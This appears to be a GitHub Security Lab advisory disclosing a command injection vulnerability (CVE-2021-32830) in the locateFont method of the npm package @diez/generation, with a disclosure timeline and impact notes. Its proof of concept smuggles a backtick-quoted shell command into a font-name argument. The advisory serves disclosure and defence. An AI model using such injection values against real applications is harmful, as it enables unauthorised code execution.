<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 21, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-061: Command injection in @diez/generation - CVE-2021-32830</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-03-25: Opened <a href="https://github.com/diez/diez/issues/153">public issue</a> to reach maintainers</li>
  <li>2021-07-05: Deadline expired</li>
  <li>2021-07-05: Publication as per our disclosure policy</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <code class="language-plaintext highlighter-rouge">locateFont</code> method has a command injection vulnerability. Clients of the @diez/generation library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.</p>

<h2 id="product">Product</h2>

<p>@diez/generation</p>

<h2 id="tested-version">Tested Version</h2>

<p>Latest commit at the time of reporting (March 25, 2021).</p>

<h2 id="details">Details</h2>

<h3 id="command-injection-in-locatefont">Command injection in <code class="language-plaintext highlighter-rouge">locateFont</code></h3>

<p>The following proof-of-concept illustrates the vulnerability. First install @diez/generation:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install @diez/generation
</code></pre></div></div>

<p>Now create a file with the following contents:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const generation = require("@diez/generation");
generation.locateFont("foo'`touch /tmp/exploit` '", {});
</code></pre></div></div>

<p>and run it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node test.js
</code></pre></div></div>

<p>Notice that a file named <code class="language-plaintext highlighter-rouge">exploit</code> has been created.</p>

<p>The PoC only works on MacOS or on an Unix machine if the isMacOS function is patched in local installation (can be found in <code class="language-plaintext highlighter-rouge">node_modules/@diez/cli-core/lib/utils.js</code>).</p>

<p>This vulnerability is similar to command injection vulnerabilities that have been found in other Javascript libraries. Here are some examples:
<a href="https://github.com/advisories/GHSA-m8xj-5v73-3hh8">CVE-2020-7646</a>,
<a href="https://github.com/advisories/GHSA-426h-24vj-qwxf">CVE-2020-7614</a>,
<a href="https://github.com/advisories/GHSA-5q88-cjfq-g2mh">CVE-2020-7597</a>,
<a href="https://github.com/advisories/GHSA-4gp3-p7ph-x2jr">CVE-2019-10778</a>,
<a href="https://github.com/advisories/GHSA-84cm-v6jp-gjmr">CVE-2019-10776</a>,
<a href="https://github.com/advisories/GHSA-9jm3-5835-537m">CVE-2018-16462</a>,
<a href="https://github.com/advisories/GHSA-7g2w-6r25-2j7p">CVE-2018-16461</a>,
<a href="https://github.com/advisories/GHSA-cfhg-9x44-78h2">CVE-2018-16460</a>,
<a href="https://github.com/advisories/GHSA-pp57-mqmh-44h7">CVE-2018-13797</a>,
<a href="https://github.com/advisories/GHSA-c9j3-wqph-5xx9">CVE-2018-3786</a>,
<a href="https://github.com/advisories/GHSA-wjr4-2jgw-hmv8">CVE-2018-3772</a>,
<a href="https://github.com/advisories/GHSA-3pxp-6963-46r9">CVE-2018-3746</a>,
<a href="https://github.com/advisories/GHSA-jcw8-r9xm-32c6">CVE-2017-16100</a>,
<a href="https://github.com/advisories/GHSA-qh2h-chj9-jffq">CVE-2017-16042</a>.</p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32830</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub Engineer <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-061</code> in any communication regarding this issue.</p>


    